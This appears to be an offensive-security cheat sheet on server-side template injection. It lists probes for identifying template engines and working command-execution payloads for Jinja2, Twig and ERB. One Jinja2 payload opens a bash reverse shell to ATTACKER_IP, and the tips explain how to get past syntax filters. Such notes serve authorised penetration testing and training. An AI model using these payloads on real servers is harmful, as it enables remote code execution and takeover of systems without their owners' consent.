# SSTI (Server-Side Template Injection)

See also: [[Web-Methodology]]

## Detection

Inject into any input field and check output:

```
{{7*7}} → 49 = Jinja2/Twig
${7*7} → 49 = Freemarker/Mako
<%= 7*7 %> → 49 = ERB
#{7*7} → 49 = Slim/Pug

{{7*'7'}} → 7777777 = Jinja2 (confirms vs Twig which returns 49)
```

## Jinja2 (Python / Flask)

```
{{config}}
```

```
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

Reverse shell:

```
{{self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1"').read()}}
```

## Twig (PHP)

```
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
```

## ERB (Ruby)

```
<%= system("id") %>
<%= `id` %>
```

## Tips

- Use Wappalyzer to identify framework first (Flask, Django, Express, etc.)
- HackTricks has a decision tree for identifying the template engine
- If `{{}}` is blocked, try `{% %}` or `${}` syntax
- Check for reflected input anywhere - not just obvious form fields
